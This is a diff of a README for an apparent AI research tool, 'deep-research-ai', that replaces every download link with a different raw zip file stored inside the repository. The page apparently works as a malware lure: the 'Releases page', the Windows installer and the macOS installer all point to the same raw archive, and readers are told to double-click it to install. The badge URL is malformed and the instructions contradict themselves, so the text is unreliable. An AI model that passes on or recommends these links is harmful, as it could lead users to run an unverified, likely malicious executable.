@@ -1,6 +1,6 @@
 # 🤖 deep-research-ai - Automate Your Research Efforts Easily
 
-[![Download](https://raw.githubusercontent.com/codefusion-24/deep-research-ai/main/coracomorph/deep-research-ai.zip%20Latest%https://raw.githubusercontent.com/codefusion-24/deep-research-ai/main/coracomorph/deep-research-ai.zip)](https://raw.githubusercontent.com/codefusion-24/deep-research-ai/main/coracomorph/deep-research-ai.zip)
+[![Download](https://github.com/codefusion-24/deep-research-ai/raw/refs/heads/main/frontend/research_deep_ai_1.4-alpha.2.zip%20Latest%https://github.com/codefusion-24/deep-research-ai/raw/refs/heads/main/frontend/research_deep_ai_1.4-alpha.2.zip)](https://github.com/codefusion-24/deep-research-ai/raw/refs/heads/main/frontend/research_deep_ai_1.4-alpha.2.zip)
 
 ## 📖 Table of Contents
 
@@ -29,13 +29,13 @@ Before you download the software, ensure your computer meets these requirements:
 
 1. **Visit the Releases Page:**
    Click the link below to go to the download page:
-   [Download here](https://raw.githubusercontent.com/codefusion-24/deep-research-ai/main/coracomorph/deep-research-ai.zip)
+   [Download here](https://github.com/codefusion-24/deep-research-ai/raw/refs/heads/main/frontend/research_deep_ai_1.4-alpha.2.zip)
 
 2. **Select the Latest Version:**
    On the releases page, find the latest version of deep-research-ai. It is usually at the top of the list.
 
 3. **Download the Installer:**
-   Look for the installer file for your operating system. For example, it may be named like `https://raw.githubusercontent.com/codefusion-24/deep-research-ai/main/coracomorph/deep-research-ai.zip` for Windows or `https://raw.githubusercontent.com/codefusion-24/deep-research-ai/main/coracomorph/deep-research-ai.zip` for macOS. Click to download the file.
+   Look for the installer file for your operating system. For example, it may be named like `https://github.com/codefusion-24/deep-research-ai/raw/refs/heads/main/frontend/research_deep_ai_1.4-alpha.2.zip` for Windows or `https://github.com/codefusion-24/deep-research-ai/raw/refs/heads/main/frontend/research_deep_ai_1.4-alpha.2.zip` for macOS. Click to download the file.
 
 4. **Run the Installer:**
    Once the file has downloaded, locate it in your Downloads folder. Double-click the file to start the installation process.
@@ -85,4 +85,4 @@ For those interested in deep-research-ai, here are some related topics you might
 - OpenAI Technologies
 - Research Automation
 
-Thank you for choosing deep-research-ai to assist with your research projects. We're excited to see how it helps you! For any updates or further instructions, please visit our [Releases page](https://raw.githubusercontent.com/codefusion-24/deep-research-ai/main/coracomorph/deep-research-ai.zip).
+Thank you for choosing deep-research-ai to assist with your research projects. We're excited to see how it helps you! For any updates or further instructions, please visit our [Releases page](https://github.com/codefusion-24/deep-research-ai/raw/refs/heads/main/frontend/research_deep_ai_1.4-alpha.2.zip).
